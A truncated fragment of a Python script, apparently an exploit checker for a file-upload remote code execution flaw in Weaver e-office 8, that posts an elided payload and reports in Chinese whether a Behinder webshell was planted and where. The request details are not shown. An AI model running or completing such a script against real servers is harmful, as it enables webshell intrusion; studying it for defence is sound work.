...
def main(target_url):
    ...
    print(now_time() + " [INFO]     正在检测泛微weaveroa-eoffice8-upload-RCE")
    try:
        requests.packages.urllib3.disable_warnings()
        upload = requests.post(exp_url, headers=headers, data=data, verify=False)
        if upload.status_code == 200:
            if shell.status_code == 200:
                print(now_time() + ' [SUCCESS]  泛微文件上传漏洞存在,冰蝎默认密码')
                print(now_time() + ' [SUCCESS]  路径存在再返回值中：{}'.format(upload.text))
            else:
                print(now_time() + ' [WARNING]  泛微weaveroa-eoffice8-upload-RCE漏洞payload执行成功，但木马检测失败哦')
        else:
            print(now_time() + ' [WARNING]  泛微weaveroa-eoffice8-upload-RCE不存在')
    except:
